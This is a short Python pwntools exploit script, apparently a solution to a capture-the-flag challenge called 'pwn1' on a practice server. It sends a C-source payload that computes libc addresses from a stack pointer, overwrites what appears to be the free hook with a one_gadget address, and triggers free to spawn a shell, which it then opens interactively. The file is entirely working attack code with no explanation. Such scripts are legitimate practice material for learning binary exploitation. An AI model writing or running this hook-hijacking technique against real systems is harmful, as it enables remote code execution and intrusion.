#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process(['./pwn1'],env={"LD_PRELOAD":"./libc6_2.23-0ubuntu11_amd64.so"})
	#p = process('./pwn1')
	elf = ELF("./pwn1")
else:
	#p = remote('182.92.73.10',24573)
	p = remote('node3.buuoj.cn',29672)
	elf = ELF("./pwn1")

#gdb.attach(p)

payload ='''
char *s;
char *n;
char *ptr;
int main()
{
	char v;
	int l;
	int *h;

	l = &v - 5406680;
	h = l + 3958696;

	*h = (l + 0x4526a);
	free(v);

}
'''
#printf("%p",&v);


sla("I'm living...\n",payload)


ia()